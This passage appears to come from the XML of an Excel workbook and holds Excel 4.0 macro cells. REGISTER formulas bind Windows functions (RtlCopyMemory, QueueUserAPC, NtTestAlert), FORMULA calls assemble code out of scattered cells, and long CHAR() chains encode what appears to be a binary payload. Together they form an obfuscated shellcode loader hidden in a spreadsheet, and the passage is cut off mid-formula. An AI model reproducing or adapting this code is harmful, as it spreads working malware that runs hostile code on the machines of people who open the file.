&amp;CHAR(101)&amp;CHAR(247)&amp;CHAR(250)&amp;CHAR(255)&amp;CHAR(55)&amp;CHAR(142)&amp;CHAR(100)&amp;CHAR(30)&amp;CHAR(228)&amp;CHAR(85)&amp;CHAR(225)&amp;CHAR(227)&amp;CHAR(207)&amp;CHAR(219)&amp;CHAR(171)&amp;CHAR(29)&amp;CHAR(228)&amp;CHAR(93)&amp;CHAR(179)&amp;CHAR(62)&amp;CHAR(187)&amp;CHAR(94)&amp;CHAR(131)&amp;CHAR(102)&amp;CHAR(21)&amp;CHAR(117)&amp;CHAR(119)&amp;CHAR(179)&amp;CHAR(10)&amp;CHAR(197)&amp;CHAR(154)&amp;CHAR(101)&amp;CHAR(95)&amp;CHAR(136)&amp;CHAR(195)&amp;CHAR(124)&amp;CHAR(56)&amp;CHAR(67)&amp;CHAR(243)&amp;CHAR(101)&amp;CHAR(189)&amp;CHAR(127)&amp;CHAR(78)&amp;CHAR(168)&amp;CHAR(191)&amp;CHAR(186)&amp;CHAR(201)&amp;CHAR(105)&amp;CHAR(112)&amp;CHAR(52)&amp;CHAR(162)&amp;CHAR(176)&amp;CHAR(112)&amp;CHAR(11)&amp;CHAR(42)&amp;CHAR(204)&amp;CHAR(162)&amp;CHAR(172)&amp;CHAR(253)&amp;CHAR(131)&amp;CHAR(235)&amp;CHAR(33)&amp;CHAR(102)&amp;CHAR(71)&amp;CHAR(53)&amp;CHAR(39)&amp;CHAR(125)&amp;CHAR(152)&amp;CHAR(145)</f>
        <v>k^uF_x001F_Z_x0004_»'ôDsö2-””!‡_x000D_WO\¼úÒÐüáÇvÖj_x0014_Y_x0010_d›	k„XDÌëÅ)â¥Itøð(ÁNa_x0016_@L%*…G_x0012_2oè,‹±°^ž;¹_x001B_½ë_x000F_é–C_x0002_­^ë¤ÎÁ
´j_x000F_öµÉ- ‘ò_x0007_¡­Áó´Ú-ê·úâçU%Û_x0014_µ:¾ª4IŠø_x0001_LÀ$_x0018_½oAÕÃ¸7_x0016_/,—×_x0013_º_x001E_Ý„Ä	¹üŸK_x000F_¨Ã}ˆoÔŠÂNÆ §»†Ü![ŸA®_x0015_¡–$4ke÷úÿ7Žd_x001E_äUáãÏÛ«_x001D_ä]³&gt;»^ƒf_x0015_uw³
Åše_ˆÃ|8Cóe½N¨¿ºÉip4¢°p_x000B_*Ì¢¬ýƒë!fG5'}˜‘</v>
      </c>
      <c r="DG27" t="str">
        <f>CHAR(27)&amp;CHAR(221)&amp;CHAR(38)&amp;CHAR(220)&amp;CHAR(62)&amp;CHAR(107)&amp;CHAR(79)&amp;CHAR(181)&amp;CHAR(234)&amp;CHAR(196)</f>
        <v>_x001B_Ý&amp;Ü&gt;kOµêÄ</v>
      </c>
      <c r="DH27" t="s">
        <v>26</v>
      </c>
      <c r="DJ27">
        <f>REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)</f>
        <v>858783747</v>
      </c>
    </row>
    <row r="28" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE28" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH37&amp;DH5&amp;DH18&amp;DH14&amp;DH5&amp;DH12&amp;DH56&amp;DH55&amp;DH68&amp;DH76&amp;DH68&amp;DH43&amp;DH21&amp;DH5&amp;DH21&amp;DH5&amp;DH47&amp;DH19&amp;DH5&amp;DH18&amp;DH27&amp;DH42&amp;DH29&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH36&amp;DH36&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH43&amp;DH21&amp;DH5&amp;DH21&amp;DH5&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ28)</f>
        <v>1</v>
      </c>
      <c r="DF28" t="str">
        <f>CHAR(122)&amp;CHAR(97)&amp;CHAR(173)&amp;CHAR(135)&amp;CHAR(59)&amp;CHAR(65)&amp;CHAR(228)&amp;CHAR(127)&amp;CHAR(172)&amp;CHAR(116)&amp;CHAR(75)&amp;CHAR(97)&amp;CHAR(252)&amp;CHAR(164)&amp;CHAR(181)&amp;CHAR(20)&amp;CHAR(204)&amp;CHAR(148)&amp;CHAR(214)&amp;CHAR(59)&amp;CHAR(106)&amp;CHAR(183)&amp;CHAR(249)&amp;CHAR(176)&amp;CHAR(212)&amp;CHAR(174)&amp;CHAR(200)&amp;CHAR(201)&amp;CHAR(64)&amp;CHAR(157)&amp;CHAR(209)&amp;CHAR(165)&amp;CHAR(176)&amp;CHAR(28)&amp;CHAR(53)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(227)&amp;CHAR(251)&amp;CHAR(205)&amp;CHAR(32)&amp;CHAR(84)&amp;CHAR(94)&amp;CHAR(221)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(182)&amp;CHAR(211)&amp;CHAR(216)&amp;CHAR(143)&amp;CHAR(247)&amp;CHAR(153)&amp;CHAR(9)&amp;CHAR(15)&amp;CHAR(33)&amp;CHAR(82)&amp;CHAR(131)&amp;CHAR(2)&amp;CHAR(238)&amp;CHAR(109)&amp;CHAR(89)&amp;CHAR(162)&amp;CHAR(171)&amp;CHAR(155)&amp;CHAR(64)&amp;CHAR(89)&amp;CHAR(244)&amp;CHAR(141)&amp;CHAR(153)&amp;CHAR(96)&amp;CHAR(198)&amp;CHAR(194)&amp;CHAR(203)&amp;CHAR(184)&amp;CHAR(7)&amp;CHAR(131)&amp;CHAR(200)&amp;CHAR(140)&amp;CHAR(252)&amp;CHAR(64)&amp;CHAR(119)&amp;CHAR(234)&amp;CHAR(153)&amp;CHAR(198)&amp;CHAR(84)&amp;CHAR(166)&amp;CHAR(17)&amp;CHAR(90)&amp;CHAR(227)&amp;CHAR(58)&amp;CHAR(14)&amp;CHAR(64)&amp;CHAR(102)&amp;CHAR(165)&amp;CHAR(117)&amp;CHAR(88)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(192)&amp;CHAR(102)&amp;CHAR(231)&amp;CHAR(50)&amp;CHAR(135)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(213)&amp;CHAR(77)&amp;CHAR(202)&amp;CHAR(194)&amp;CHAR(26)&amp;CHAR(29)&amp;CHAR(245)&amp;CHAR(142)&amp;CHAR(112)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(169)&amp;CHAR(253)&amp;CHAR(9)&amp;CHAR(147)&amp;CHAR(183)&amp;CHAR(191)&amp;CHAR(108)&amp;CHAR(95)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(32)&amp;CHAR(248)&amp;CHAR(236)&amp;CHAR(212)&amp;CHAR(69)&amp;CHAR(121)&amp;CHAR(120)&amp;CHAR(168)&amp;CHAR(165)&amp;CHAR(74)&amp;CHAR(105)&amp;CHAR(49)&amp;CHAR(180)&amp;CHAR(183)&amp;CHAR(116)&amp;CHAR(55)&amp;CHAR(23)&amp;CHAR(164)&amp;CHAR(150)&amp;CHAR(166)&amp;CHAR(176)&amp;CHAR(156)&amp;CHAR(200)&amp;CHAR(58)&amp;CHAR(39)&amp;CHAR(74)&amp;CHAR(155)&amp;CHAR(20)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(41)&amp;CHAR(160)&amp;CHAR(162)&amp;CHAR(63)&amp;CHAR(67)&amp;CHAR(221)&amp;CHAR(148)&amp;CHAR(93)&amp;CHAR(211)&amp;CHAR(188)&amp;CHAR(117)&amp;CHAR(20)&amp;CHAR(202)&amp;CHAR(77)&amp;CHAR(19)&amp;CHAR(136)&amp;CHAR(56)&amp;CHAR(12)&amp;CHAR(88)&amp;CHAR(29)&amp;CHAR(116)&amp;CHAR(28)&amp;CHAR(74)&amp;CHAR(174)&amp;CHAR(214)&amp;CHAR(210)&amp;CHAR(237)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(98)&amp;CHAR(70)&amp;CHAR(8)&amp;CHAR(241)&amp;CHAR(126)&amp;CHAR(150)&amp;CHAR(254)&amp;CHAR(21)&amp;CHAR(179)&amp;CHAR(70)&amp;CHAR(28)&amp;CHAR(53)&amp;CHAR(179)&amp;CHAR(95)&amp;CHAR(191)&amp;CHAR(170)&amp;CHAR(188)&amp;CHAR(213)&amp;CHAR(204)&amp;CHAR(37)&amp;CHAR(7)&amp;CHAR(238)&amp;CHAR(96)&amp;CHAR(89)&amp;CHAR(150)&amp;CHAR(200)&amp;CHAR(206)&amp;CHAR(171)&amp;CHAR(92)&amp;CHAR(96)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(136)&amp;CHAR(30)&amp;CHAR(140)&amp;CHAR(216)&amp;CHAR(6)&amp;CHAR(118)&amp;CHAR(243)&amp;CHAR(16)&amp;CHAR(37)&amp;CHAR(93)&amp;CHAR(152)&amp;CHAR(33)&amp;CHAR(226)&amp;CHAR(174)&amp;CHAR(3)&amp;CHAR(76)&amp;CHAR(116)&amp;CHAR(103)&amp;CHAR(251)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(94)&amp;CHAR(193)&amp;CHAR(31)&amp;CHAR(28)&amp;CHAR(97)&amp;CHAR(213)&amp;CHAR(69)&amp;CHAR(100)&amp;CHAR(153)&amp;CHAR(16)&amp;CHAR(243)&amp;CHAR(120)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(235)</f>
        <v>za­‡;Aä¬tKaü¤µ_x0014_Ì”Ö;j·ù°Ô®ÈÉ@Ñ¥°_x001C_5Ê‚ãûÍ T^Ý_x000D_-¶ÓØ÷™	_x000F_!Rƒ_x0002_îmY¢«›@Yô™`ÆÂË¸_x0007_ƒÈŒü@wê™ÆT¦_x0011_Zã:_x000E_@f¥uX.‚Àfç2‡†BÕMÊÂ_x001A__x001D_õŽp/_x0011_©ý	“·¿l_UP øìÔEyx¨¥Ji1´·t7_x0017_¤–¦°œÈ:'J›_x0014_7×) ¢?CÝ”]Ó¼u_x0014_ÊM_x0013_ˆ8_x000C_X_x001D_t_x001C_J®ÖÒí'EbF_x0008_ñ~–þ_x0015_³F_x001C_5³_¿ª¼ÕÌ%_x0007_î`Y–ÈÎ«\`‚é&amp;7ˆ_x001E_ŒØ_x0006_vó_x0010_%]˜!â®_x0003_LtgûˆG^Á_x001F__x001C_aÕEd™_x0010_óx«&gt;ë</v>
      </c>
      <c r="DG28" t="str">
        <f>CHAR(26)&amp;CHAR(230)&amp;CHAR(21)&amp;CHAR(109)&amp;CHAR(159)&amp;CHAR(57)&amp;CHAR(20)&amp;CHAR(126)&amp;CHAR(118)&amp;CHAR(158)</f>
        <v>_x001A_æ_x0015_mŸ9_x0014_~vž</v>
      </c>
      <c r="DH28" t="s">
        <v>27</v>
      </c>
      <c r="DJ28">
        <f>REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)</f>
        <v>-1103233020</v>
      </c>
    </row>
    <row r="29" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE29" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH31&amp;DH33&amp;DH35&amp;DH45&amp;DH46&amp;DH31&amp;DH44&amp;DH66&amp;DH68&amp;DH14&amp;DH20&amp;DH4&amp;DH12&amp;DH12&amp;DH68&amp;DH76&amp;DH68&amp;DH40&amp;DH20&amp;DH46&amp;DH5&amp;DH19&amp;DH20&amp;DH27&amp;DH12&amp;DH5&amp;DH18&amp;DH20&amp;DH68&amp;DH76&amp;DH68&amp;DH36&amp;DH68&amp;DH76&amp;DH68&amp;DH33&amp;DH15&amp;DH68&amp;DH76&amp;DH76&amp;DH54&amp;DH76&amp;DH62&amp;DH67,DJ29)</f>
        <v>1</v>
      </c>
      <c r="DF29" t="str">
        <f>CHAR(210)&amp;CHAR(244)&amp;CHAR(26)&amp;CHAR(199)&amp;CHAR(124)&amp;CHAR(147)&amp;CHAR(36)&amp;CHAR(29)&amp;CHAR(218)&amp;CHAR(63)&amp;CHAR(102)&amp;CHAR(167)&amp;CHAR(253)&amp;CHAR(119)&amp;CHAR(186)&amp;CHAR(20)&amp;CHAR(247)&amp;CHAR(107)&amp;CHAR(48)&amp;CHAR(42)&amp;CHAR(252)&amp;CHAR(108)&amp;CHAR(36)&amp;CHAR(170)&amp;CHAR(171)&amp;CHAR(39)&amp;CHAR(168)&amp;CHAR(62)&amp;CHAR(251)&amp;CHAR(19)&amp;CHAR(141)&amp;CHAR(44)&amp;CHAR(165)&amp;CHAR(56)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(97)&amp;CHAR(5)&amp;CHAR(97)&amp;CHAR(128)&amp;CHAR(96)&amp;CHAR(33)&amp;CHAR(92)&amp;CHAR(249)&amp;CHAR(243)&amp;CHAR(69)&amp;CHAR(187)&amp;CHAR(72)&amp;CHAR(235)&amp;CHAR(158)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(71)&amp;CHAR(20)&amp;CHAR(16)&amp;CHAR(2)&amp;CHAR(243)&amp;CHAR(169)&amp;CHAR(252)&amp;CHAR(203)&amp;CHAR(194)&amp;CHAR(59)&amp;CHAR(122)&amp;CHAR(137)&amp;CHAR(143)&amp;CHAR(191)&amp;CHAR(141)&amp;CHAR(177)&amp;CHAR(184)&amp;CHAR(125)&amp;CHAR(107)&amp;CHAR(235)&amp;CHAR(97)&amp;CHAR(135)&amp;CHAR(211)&amp;CHAR(164)&amp;CHAR(71)&amp;CHAR(143)&amp;CHAR(179)&amp;CHAR(183)&amp;CHAR(40)&amp;CHAR(114)&amp;CHAR(99)&amp;CHAR(201)&amp;CHAR(47)&amp;CHAR(82)&amp;CHAR(251)&amp;CHAR(26)&amp;CHAR(103)&amp;CHAR(148)&amp;CHAR(206)&amp;CHAR(129)&amp;CHAR(249)&amp;CHAR(9)&amp;CHAR(22)&amp;CHAR(166)&amp;CHAR(166)&amp;CHAR(25)&amp;CHAR(188)&amp;CHAR(218)&amp;CHAR(251)&amp;CHAR(12)&amp;CHAR(80)&amp;CHAR(19)&amp;CHAR(227)&amp;CHAR(164)&amp;CHAR(226)&amp;CHAR(219)&amp;CHAR(131)&amp;CHAR(250)&amp;CHAR(24)&amp;CHAR(142)&amp;CHAR(232)&amp;CHAR(21)&amp;CHAR(229)&amp;CHAR(107)&amp;CHAR(191)&amp;CHAR(65)&amp;CHAR(175)&amp;CHAR(87)&amp;CHAR(147)&amp;CHAR(236)&amp;CHAR(252)&amp;CHAR(56)&amp;CHAR(134)&amp;CHAR(19)&amp;CHAR(107)&amp;CHAR(22)&amp;CHAR(36)&amp;CHAR(152)&amp;CHAR(111)&amp;CHAR(146)&amp;CHAR(47)&amp;CHAR(225)&amp;CHAR(56)&amp;CHAR(226)&amp;CHAR(57)&amp;CHAR(31)&amp;CHAR(136)&amp;CHAR(10)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(76)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(86)&amp;CHAR(234)&amp;CHAR(108)&amp;CHAR(46)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(38)&amp;CHAR(216)&amp;CHAR(87)&amp;CHAR(80)&amp;CHAR(150)&amp;CHAR(146)&amp;CHAR(251)&amp;CHAR(225)&amp;CHAR(7)&amp;CHAR(255)&amp;CHAR(92)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(25)&amp;CHAR(16)&amp;CHAR(168)&amp;CHAR(77)&amp;CHAR(147)&amp;CHAR(184)&amp;CHAR(51)&amp;CHAR(147)&amp;CHAR(102)&amp;CHAR(212)&amp;CHAR(106)&amp;CHAR(189)&amp;CHAR(104)&amp;CHAR(144)&amp;CHAR(254)&amp;CHAR(40)&amp;CHAR(46)&amp;CHAR(121)&amp;CHAR(148)&amp;CHAR(158)&amp;CHAR(102)&amp;CHAR(210)&amp;CHAR(83)&amp;CHAR(185)&amp;CHAR(158)&amp;CHAR(233)&amp;CHAR(254)&amp;CHAR(110)&amp;CHAR(231)&amp;CHAR(169)&amp;CHAR(69)&amp;CHAR(192)&amp;CHAR(139)&amp;CHAR(64)&amp;CHAR(251)&amp;CHAR(75)&amp;CHAR(111)&amp;CHAR(180)&amp;CHAR(110)&amp;CHAR(123)&amp;CHAR(9)&amp;CHAR(171)&amp;CHAR(182)&amp;CHAR(25)&amp;CHAR(109)&amp;CHAR(54)&amp;CHAR(159)&amp;CHAR(42)&amp;CHAR(79)&amp;CHAR(38)&amp;CHAR(14)&amp;CHAR(191)&amp;CHAR(85)&amp;CHAR(175)&amp;CHAR(78)&amp;CHAR(233)&amp;CHAR(92)&amp;CHAR(86)&amp;CHAR(161)&amp;CHAR(98)&amp;CHAR(228)&amp;CHAR(247)&amp;CHAR(50)&amp;CHAR(132)&amp;CHAR(145)&amp;CHAR(125)&amp;CHAR(12)&amp;CHAR(71)&amp;CHAR(248)&amp;CHAR(42)&amp;CHAR(186)&amp;CHAR(53)&amp;CHAR(87)&amp;CHAR(194)&amp;CHAR(225)&amp;CHAR(174)&amp;CHAR(198)&amp;CHAR(16)&amp;CHAR(103)&amp;CHAR(154)&amp;CHAR(98)&amp;CHAR(10)&amp;CHAR(145)&amp;CHAR(215)&amp;CHAR(101)&amp;CHAR(90)&amp;CHAR(159)&amp;CHAR(146)</f>
        <v>Òô_x001A_Ç|“$_x001D_Ú?f§ýwº_x0014_÷k0*ül$ª«'¨&gt;û_x0013_,¥8I_x0002_ºa_x0005_a€`!\ùóE»HëžãüG_x0014__x0010__x0002_ó©üËÂ;z‰¿±¸}këa‡Ó¤G³·(rcÉ/Rû_x001A_g”Îù	_x0016_¦¦_x0019_¼Úû_x000C_P_x0013_ã¤âÛƒú_x0018_Žè_x0015_åk¿A¯W“ìü8†_x0013_k_x0016_$˜o’/á8â9_x001F_ˆ
_x000F__x000C_L_x0006_TUPVêl._x000F__x0011_&amp;ØWP–’ûá_x0007_ÿ\8»_x0019__x0010_¨M“¸3“fÔj½hþ(.y”žfÒS¹žéþnç©EÀ‹@ûKo´n{	«¶_x0019_m6Ÿ*O&amp;_x000E_¿U¯Né\V¡bä÷2„‘}_x000C_Gø*º5WÂá®Æ_x0010_gšb
‘×eZŸ’</v>
      </c>
      <c r="DG29" t="str">
        <f>CHAR(212)&amp;CHAR(90)&amp;CHAR(172)&amp;CHAR(61)&amp;CHAR(20)&amp;CHAR(17)&amp;CHAR(30)&amp;CHAR(146)&amp;CHAR(94)&amp;CHAR(229)</f>
        <v>ÔZ¬=_x0014__x0011__x001E_’^å</v>
      </c>
      <c r="DH29" t="s">
        <v>28</v>
      </c>
      <c r="DJ29">
        <f>REGISTER("ntdll","NtTestAlert","J","Go",,1,9)</f>
        <v>-690421755</v>
      </c>
    </row>
    <row r="30" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE30" t="b">
        <f>FORMULA(DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH65&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH54,DJ30)</f>
        <v>1</v>
      </c>
      <c r="DF30" t="str">
        <f>CHAR(135)&amp;CHAR(67)&amp;CHAR(128)&amp;CHAR(173)&amp;CHAR(223)&amp;CHAR(248)&amp;CHAR(214)&amp;CHAR(28)&amp;CHAR(225)&amp;CHAR(24)&amp;CHAR(177)&amp;CHAR(246)&amp;CHAR(31)&amp;CHAR(163)&amp;CHAR(97)&amp;CHAR(139)&amp;CHAR(131)&amp;CHAR(52)&amp;CHAR(71)&amp;CHAR(51)&amp;CHAR(77)&amp;CHAR(66)&amp;CHAR(235)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(237)&amp;CHAR(114)&amp;CHAR(162)&amp;CHAR(191)&amp;CHAR(2)&amp;CHAR(49)&amp;CHAR(211)&amp;CHAR(151)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(207)&amp;CHAR(245)&amp;CHAR(5)&amp;CHAR(99)&amp;CHAR(245)&amp;CHAR(213)&amp;CHAR(135)&amp;CHAR(217)&amp;CHAR(200)&amp;CHAR(50)&amp;CHAR(193)&amp;CHAR(193)&amp;CHAR(43)&amp;CHAR(12)&amp;CHAR(243)&amp;CHAR(81)&amp;CHAR(222)&amp;CHAR(25)&amp;CHAR(53)&amp;CHAR(183)&amp;CHAR(254)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(71)&amp;CHAR(4)&amp;CHAR(115)&amp;CHAR(190)&amp;CHAR(184)&amp;CHAR(143)&amp;CHAR(172)&amp;CHAR(228)&amp;CHAR(30)&amp;CHAR(195)&amp;CHAR(164)&amp;CHAR(242)&amp;CHAR(64)&amp;CHAR(109)&amp;CHAR(216)&amp;CHAR(45)&amp;CHAR(201)&amp;CHAR(234)&amp;CHAR(216)&amp;CHAR(201)&amp;CHAR(247)&amp;CHAR(240)&amp;CHAR(141)&amp;CHAR(158)&amp;CHAR(101)&amp;CHAR(181)&amp;CHAR(168)&amp;CHAR(50)&amp;CHAR(199)&amp;CHAR(63)&amp;CHAR(166)&amp;CHAR(167)&amp;CHAR(144)&amp;CHAR(234)&amp;CHAR(5)&amp;CHAR(169)&amp;CHAR(164)&amp;CHAR(16)&amp;CHAR(10)&amp;CHAR(228)&amp;CHAR(101)&amp;CHAR(53)&amp;CHAR(48)&amp;CHAR(150)&amp;CHAR(218)&amp;CHAR(46)&amp;CHAR(151)&amp;CHAR(113)&amp;CHAR(203)&amp;CHAR(60)&amp;CHAR(217)&amp;CHAR(223)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(244)&amp;CHAR(223)&amp;CHAR(14)&amp;CHAR(175)&amp;CHAR(59)&amp;CHAR(167)&amp;CHAR(185)&amp;CHAR(243)&amp;CHAR(85)&amp;CHAR(166)&amp;CHAR(132)&amp;CHAR(12)&amp;CHAR(162)&amp;CHAR(252)&amp;CHAR(188)&amp;CHAR(216)&amp;CHAR(242)&amp;CHAR(60)&amp;CHAR(221)&amp;CHAR(123)&amp;CHAR(75)&amp;CHAR(58)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(37)&amp;CHAR(143)&amp;CHAR(101)&amp;CHAR(201)&amp;CHAR(61)&amp;CHAR(141)&amp;CHAR(248)&amp;CHAR(199)&amp;CHAR(252)&amp;CHAR(9)&amp;CHAR(150)&amp;CHAR(22)&amp;CHAR(166)&amp;CHAR(121)&amp;CHAR(201)&amp;CHAR(101)&amp;CHAR(27)&amp;CHAR(151)&amp;CHAR(16)&amp;CHAR(140)&amp;CHAR(179)&amp;CHAR(38)&amp;CHAR(96)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(142)&amp;CHAR(99)&amp;CHAR(36)&amp;CHAR(100)&amp;CHAR(199)&amp;CHAR(68)&amp;CHAR(2)&amp;CHAR(170)&amp;CHAR(87)&amp;CHAR(251)&amp;CHAR(1)&amp;CHAR(168)&amp;CHAR(161)&amp;CHAR(35)&amp;CHAR(171)&amp;CHAR(47)&amp;CHAR(236)&amp;CHAR(207)&amp;CHAR(1)&amp;CHAR(221)&amp;CHAR(192)&amp;CHAR(202)&amp;CHAR(99)&amp;CHAR(204)&amp;CHAR(152)&amp;CHAR(43)&amp;CHAR(138)&amp;CHAR(125)&amp;CHAR(67)&amp;CHAR(57)&amp;CHAR(254)&amp;CHAR(140)&amp;CHAR(222)&amp;CHAR(68)&amp;CHAR(48)&amp;CHAR(73)&amp;CHAR(200)&amp;CHAR(150)&amp;CHAR(142)&amp;CHAR(190)&amp;CHAR(162)&amp;CHAR(102)&amp;CHAR(83)&amp;CHAR(73)&amp;CHAR(166)&amp;CHAR(98)&amp;CHAR(234)&amp;CHAR(116)&amp;CHAR(185)&amp;CHAR(251)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(32)&amp;CHAR(102)&amp;CHAR(180)&amp;CHAR(6)&amp;CHAR(161)&amp;CHAR(14)&amp;CHAR(48)&amp;CHAR(115)&amp;CHAR(223)&amp;CHAR(138)&amp;CHAR(240)&amp;CHAR(109)&amp;CHAR(157)&amp;CHAR(160)&amp;CHAR(98)&amp;CHAR(218)&amp;CHAR(71)&amp;CHAR(62)&amp;CHAR(67)&amp;CHAR(63)&amp;CHAR(191)&amp;CHAR(6)&amp;CHAR(89)&amp;CHAR(114)&amp;CHAR(222)&amp;CHAR(60)&amp;CHAR(229)&amp;CHAR(77)&amp;CHAR(205)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(56)&amp;CHAR(234)&amp;CHAR(117)&amp;CHAR(129)&amp;CHAR(152)&amp;CHAR(104)&amp;CHAR(19)&amp;CHAR(175)&amp;CHAR(90)&amp;CHAR(64)&amp;CHAR(105)</f>
        <v>‡C€­ßøÖ_x001C_á_x0018_±ö_x001F_£a‹ƒ4G3MBëŒ_x0002_ír¢¿_x0002_1Ó—ùQÏõ_x0005_cõÕ‡ÙÈ2ÁÁ+_x000C_óQÞ_x0019_5·þ¿_x0005_G_x0004_s¾¸¬ä_x001E_Ã¤ò@mØ-ÉêØÉ÷ðžeµ¨2Ç?¦§ê_x0005_©¤_x0010_
äe50–Ú.—qË&lt;Ùß_x0002_‚ôß_x000E_¯;§¹óU¦„_x000C_¢ü¼Øò&lt;Ý{K:_x0013__x0001_%eÉ=øÇü	–_x0016_¦yÉe_x001B_—_x0010_Œ³&amp;`âdŽc$dÇD_x0002_ªWû_x0001_¨¡#«/ìÏ_x0001_ÝÀÊcÌ˜+Š}C9þŒÞD0IÈ–Ž¾¢fSI¦bêt¹ûA! f´_x0006_¡_x000E_0sßŠðm bÚG&gt;C?¿_x0006_YrÞ&lt;åMÍ_x0019_I8êu˜h_x0013_¯Z@i</v>
      </c>
      <c r="DG30" t="str">
        <f>CHAR(214)&amp;CHAR(53)&amp;CHAR(158)&amp;CHAR(193)&amp;CHAR(19)&amp;CHAR(92)&amp;CHAR(209)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(69)</f>
        <v>Ö5žÁ_x0013_\Ñ
†E</v>
      </c>
      <c r="DH30" t="s">
        <v>29</v>
      </c>
      <c r="DJ30" t="b">
        <f bx="1">main=$DG$1</f>
        <v>1</v>
      </c>
    </row>
    <row r="31" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE31" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH53&amp;DH67,DJ31)</f>
        <v>1</v>
      </c>
      <c r="DF31" t="str">
        <f>CHAR(3)&amp;CHAR(157)&amp;CHAR(34)&amp;CHAR(162)&amp;CHAR(70)&amp;CHAR(68)&amp;CHAR(233)&amp;CHAR(255)&amp;CHAR(239)&amp;CHAR(26)&amp;CHAR(162)&amp;CHAR(252)&amp;CHAR(119)&amp;CHAR(136)&amp;CHAR(85)&amp;CHAR(185)&amp;CHAR(98)&amp;CHAR(174)&amp;CHAR(46)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(118)&amp;CHAR(17)&amp;CHAR(238)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(58)&amp;CHAR(141)&amp;CHAR(108)&amp;CHAR(138)&amp;CHAR(36)&amp;CHAR(161)&amp;CHAR(175)&amp;CHAR(252)&amp;CHAR(18)&amp;CHAR(217)&amp;CHAR(170)&amp;CHAR(185)&amp;CHAR(47)&amp;CHAR(125)&amp;CHAR(110)&amp;CHAR(90)&amp;CHAR(172)&amp;CHAR(17)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(197)&amp;CHAR(36)&amp;CHAR(37)&amp;CHAR(255)&amp;CHAR(4)&amp;CHAR(211)&amp;CHAR(61)&amp;CHAR(113)&amp;CHAR(40)&amp;CHAR(196)&amp;CHAR(11)&amp;CHAR(150)&amp;CHAR(10)&amp;CHAR(227)&amp;CHAR(70)&amp;CHAR(229)&amp;CHAR(73)&amp;CHAR(70)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(71)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(86)&amp;CHAR(185)&amp;CHAR(26)&amp;CHAR(114)&amp;CHAR(151)&amp;CHAR(174)&amp;CHAR(75)&amp;CHAR(133)&amp;CHAR(253)&amp;CHAR(121)&amp;CHAR(93)&amp;CHAR(122)&amp;CHAR(45)&amp;CHAR(210)&amp;CHAR(131)&amp;CHAR(52)&amp;CHAR(178)&amp;CHAR(54)&amp;CHAR(212)&amp;CHAR(234)&amp;CHAR(44)&amp;CHAR(16)&amp;CHAR(27)&amp;CHAR(178)&amp;CHAR(67)&amp;CHAR(189)&amp;CHAR(195)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(85)&amp;CHAR(58)&amp;CHAR(47)&amp;CHAR(195)&amp;CHAR(52)&amp;CHAR(79)&amp;CHAR(77)&amp;CHAR(106)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(47)&amp;CHAR(117)&amp;CHAR(8)&amp;CHAR(225)&amp;CHAR(5)&amp;CHAR(179)&amp;CHAR(13)&amp;CHAR(151)&amp;CHAR(114)&amp;CHAR(101)&amp;CHAR(153)&amp;CHAR(168)&amp;CHAR(58)&amp;CHAR(201)&amp;CHAR(136)&amp;CHAR(98)&amp;CHAR(83)&amp;CHAR(204)&amp;CHAR(217)&amp;CHAR(73)&amp;CHAR(128)&amp;CHAR(40)&amp;CHAR(138)&amp;CHAR(16)&amp;CHAR(31)&amp;CHAR(72)&amp;CHAR(72)&amp;CHAR(29)&amp;CHAR(201)&amp;CHAR(197)&amp;CHAR(144)&amp;CHAR